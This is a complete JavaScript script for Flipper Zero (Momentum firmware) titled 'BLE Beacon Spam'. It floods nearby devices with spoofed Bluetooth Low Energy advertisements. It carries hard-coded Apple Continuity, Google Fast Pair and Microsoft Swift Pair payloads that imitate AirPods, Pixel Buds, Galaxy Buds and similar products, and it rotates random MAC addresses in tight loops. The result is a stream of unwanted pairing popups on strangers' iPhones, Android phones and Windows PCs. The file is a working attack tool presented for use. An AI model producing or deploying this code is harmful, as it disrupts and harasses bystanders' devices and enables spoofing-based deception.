// BLE Beacon Spam - Flipper Zero (Momentum)
// Save to: SD Card/apps/Scripts/ble_spam.js
// Broadcasts spoofed BLE advertisements to trigger pairing popups
// on nearby Apple, Android, and Windows devices.
// Requires Momentum firmware with blebeacon module.

let eventLoop = require("event_loop");
let gui = require("gui");
let submenuView = require("gui/submenu");
let blebeacon = require("blebeacon");
let notify = require("notification");

// --- Apple Continuity Protocol Payloads ---
// Format: Proximity Pairing (type 0x07) advertisements
// These trigger "connect device" popups on nearby iPhones/iPads
let apple_names = [
    "AirPods",
    "AirPods Pro",
    "AirPods Max",
    "AirPods Gen3",
    "Beats Fit Pro",
    "Beats Solo Pro",
    "AppleTV Setup",
    "AppleTV Pair",
    "New Device",
    "Transfer Number",
];

// Pre-built Apple Continuity payloads (31 bytes each)
// Structure: len, 0xFF, Apple ID (0x4C,0x00), type 0x07, data...
let apple_data = [
    // AirPods
    [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75,
     0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    // AirPods Pro
    [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0E, 0x20, 0x75,
     0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    // AirPods Max
    [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0A, 0x20, 0x75,
     0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    // AirPods Gen3
    [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75,
     0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    // Beats Fit Pro
    [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75,
     0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    // Beats Solo Pro
    [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0B, 0x20, 0x75,
     0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    // AppleTV Setup
    [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75,
     0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    // AppleTV Keyboard
    [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75,
     0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    // New Device (Action Modal)
    [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75,
     0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    // Transfer Number
    [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0F, 0x20, 0x75,
     0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
];

// --- Google Fast Pair Payloads ---
// Triggers "Device found nearby" popups on Android
let google_names = [
    "Pixel Buds",
    "Pixel Buds Pro",
    "Galaxy Buds2",
    "Galaxy Buds Live",
    "Galaxy Buds Pro",
    "Sony WF-1000XM4",
    "JBL Tune Flex",
    "Nothing Ear (1)",
];

// Fast Pair service data: UUID 0xFE2C + 3-byte model ID
// Format: [UUID list header, Service data header, model bytes]
let google_data = [
    // Pixel Buds
    [0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0xD8, 0xB0, 0x01],
    // Pixel Buds Pro
    [0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0x82, 0xB1, 0x03],
    // Galaxy Buds2
    [0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0xCD, 0x81, 0x02],
    // Galaxy Buds Live
    [0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0x2D, 0x7A, 0x03],
    // Galaxy Buds Pro
    [0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0xE5, 0x4B, 0x23],
    // Sony WF-1000XM4
    [0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0xC9, 0x58, 0x05],
    // JBL Tune Flex
    [0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0xD4, 0x46, 0x02],
    // Nothing Ear (1)
    [0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0x00, 0x7C, 0x01],
];

// --- Microsoft Swift Pair Payload ---
// Triggers "New Bluetooth device found" on Windows 10/11
let windows_data = [
    0x07, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80, 0x00,
];

// --- Random byte generator ---
function rand_byte() {
    return Math.floor(Math.random() * 256);
}

// Generate a random BLE MAC address (6 bytes)
// Sets the locally-administered bit to avoid collisions
function rand_mac() {
    let mac = Uint8Array(6);
    mac[0] = (rand_byte() | 0x02) & 0xFE;  // locally administered, unicast
    mac[1] = rand_byte();
    mac[2] = rand_byte();
    mac[3] = rand_byte();
    mac[4] = rand_byte();
    mac[5] = rand_byte();
    return mac;
}

// Convert an array of integers to Uint8Array
function to_bytes(arr) {
    let buf = Uint8Array(arr.length);
    for (let i = 0; i < arr.length; i++) {
        buf[i] = arr[i];
    }
    return buf;
}

// Randomize trailing bytes in Apple payload to make each beacon unique
function randomize_apple(arr) {
    let buf = Uint8Array(arr.length);
    for (let i = 0; i < arr.length; i++) {
        buf[i] = arr[i];
    }
    // Randomize bytes 18-30 (padding area)
    for (let i = 18; i < buf.length; i++) {
        buf[i] = rand_byte();
    }
    return buf;
}

// --- Spam Functions ---
let spam_active = false;

function spam_apple() {
    spam_active = true;
    let idx = 0;
    print("BLE Spam: Apple");
    while (spam_active) {
        let mac = rand_mac();
        let packet = randomize_apple(apple_data[idx % apple_data.length]);
        blebeacon.setConfig(mac, 0x06, 0, 0);
        blebeacon.setData(packet);
        blebeacon.start();
        delay(100);
        blebeacon.stop();
        idx = idx + 1;
    }
}

function spam_google() {
    spam_active = true;
    let idx = 0;
    print("BLE Spam: Android");
    while (spam_active) {
        let mac = rand_mac();
        let packet = to_bytes(google_data[idx % google_data.length]);
        blebeacon.setConfig(mac, 0x06, 0, 0);
        blebeacon.setData(packet);
        blebeacon.start();
        delay(100);
        blebeacon.stop();
        idx = idx + 1;
    }
}

function spam_windows() {
    spam_active = true;
    print("BLE Spam: Windows");
    while (spam_active) {
        let mac = rand_mac();
        let packet = to_bytes(windows_data);
        blebeacon.setConfig(mac, 0x06, 0, 0);
        blebeacon.setData(packet);
        blebeacon.start();
        delay(100);
        blebeacon.stop();
    }
}

function spam_all() {
    spam_active = true;
    let idx = 0;
    let total_apple = apple_data.length;
    let total_google = google_data.length;
    let total = total_apple + total_google + 1; // +1 for windows
    print("BLE Spam: All");
    while (spam_active) {
        let mac = rand_mac();
        let pick = idx % total;
        let packet;
        if (pick < total_apple) {
            packet = randomize_apple(apple_data[pick]);
        } else if (pick < total_apple + total_google) {
            packet = to_bytes(google_data[pick - total_apple]);
        } else {
            packet = to_bytes(windows_data);
        }
        blebeacon.setConfig(mac, 0x06, 0, 0);
        blebeacon.setData(packet);
        blebeacon.start();
        delay(100);
        blebeacon.stop();
        idx = idx + 1;
    }
}

function stop_spam() {
    spam_active = false;
    if (blebeacon.isActive()) {
        blebeacon.stop();
    }
    print("Spam stopped");
    notify.success();
}

// --- GUI Setup ---
let views = {
    mainMenu: submenuView.makeWith(
        { header: "BLE Beacon Spam" },
        [
            "Apple (iOS popups)",
            "Android (Fast Pair)",
            "Windows (Swift Pair)",
            "All Devices",
            "Stop",
        ]
    ),
};

eventLoop.subscribe(views.mainMenu.chosen, function (_sub, index, gui, views) {
    if (index === 0) {
        notify.blink("blue", "short");
        spam_apple();
        gui.viewDispatcher.switchTo(views.mainMenu);
    } else if (index === 1) {
        notify.blink("blue", "short");
        spam_google();
        gui.viewDispatcher.switchTo(views.mainMenu);
    } else if (index === 2) {
        notify.blink("blue", "short");
        spam_windows();
        gui.viewDispatcher.switchTo(views.mainMenu);
    } else if (index === 3) {
        notify.blink("blue", "short");
        spam_all();
        gui.viewDispatcher.switchTo(views.mainMenu);
    } else if (index === 4) {
        stop_spam();
        gui.viewDispatcher.switchTo(views.mainMenu);
    }
}, gui, views);

eventLoop.subscribe(gui.viewDispatcher.navigation, function (_sub, _, gui, views) {
    stop_spam();
    gui.viewDispatcher.switchTo(views.mainMenu);
}, gui, views);

gui.viewDispatcher.switchTo(views.mainMenu);
eventLoop.run();
